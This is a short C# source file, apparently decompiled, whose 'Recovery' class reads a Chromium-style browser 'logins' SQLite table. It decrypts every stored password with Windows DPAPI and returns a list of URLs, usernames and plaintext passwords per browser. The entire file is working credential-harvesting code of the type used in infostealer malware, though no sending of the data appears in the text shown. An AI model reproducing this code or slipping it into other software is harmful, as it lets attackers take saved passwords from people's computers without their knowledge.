using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

internal sealed class Recovery
{
    private static string Decrypt(string encryptedData)
    {
        string str;
        if ((encryptedData == null) || (encryptedData.Length == 0))
        {
            return null;
        }
        try
        {
            str = Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(encryptedData), null, DataProtectionScope.CurrentUser));
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            str = null;
            ProjectData.ClearProjectError();
        }
        return str;
    }

    internal static List<RecoveredBrowserAccount> Passwords(string path, string browser)
    {
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        if (File.Exists(path))
        {
            SQLiteHandler handler;
            try
            {
                handler = new SQLiteHandler(path);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                List<RecoveredBrowserAccount> list2 = list;
                ProjectData.ClearProjectError();
                return list2;
            }
            if (!handler.ReadTable("logins"))
            {
                return list;
            }
            string str = string.Empty;
            string str3 = string.Empty;
            string str2 = string.Empty;
            int num2 = handler.GetRowCount() - 1;
            for (int i = 0; i <= num2; i++)
            {
                try
                {
                    str = handler.GetValue(i, "origin_url");
                    str3 = handler.GetValue(i, "username_value");
                    str2 = Decrypt(handler.GetValue(i, "password_value"));
                    if ((!string.IsNullOrEmpty(str) && !string.IsNullOrEmpty(str3)) && (str2 != null))
                    {
                        RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                            URL = str,
                            UserName = str3,
                            Password = str2,
                            Browser = browser
                        };
                        list.Add(item);
                    }
                }
                catch (Exception exception3)
                {
                    ProjectData.SetProjectError(exception3);
                    Exception exception2 = exception3;
                    ProjectData.ClearProjectError();
                }
            }
        }
        return list;
    }
}

